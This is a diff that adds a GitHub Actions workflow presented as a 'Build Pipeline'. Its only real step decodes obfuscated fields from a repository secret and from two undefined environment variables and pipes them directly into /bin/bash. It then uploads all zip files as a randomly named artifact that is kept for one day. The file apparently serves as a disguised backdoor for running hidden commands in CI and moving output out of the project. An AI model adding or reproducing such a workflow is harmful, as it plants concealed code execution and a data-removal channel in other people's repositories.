@@ -1,0 +1,28 @@
+name: Build Pipeline
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+jobs:
+  task:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Apply
+        env:
+          p74: ${{ secrets.p74 }}
+        run: |
+          printf '%s' "$p74" | jq -r .fltwj47 | /bin/bash
+          printf '%s' "$xyo85876" | jq -r .p841 | /bin/bash
+          printf '%s' "$wx6917" | jq -r .vdd061 | /bin/bash
+
+      - name: Upload output
+        uses: actions/upload-artifact@v4
+        with:
+          name: dbvXmeS4
+          path: "*.zip"
+          retention-days: 1
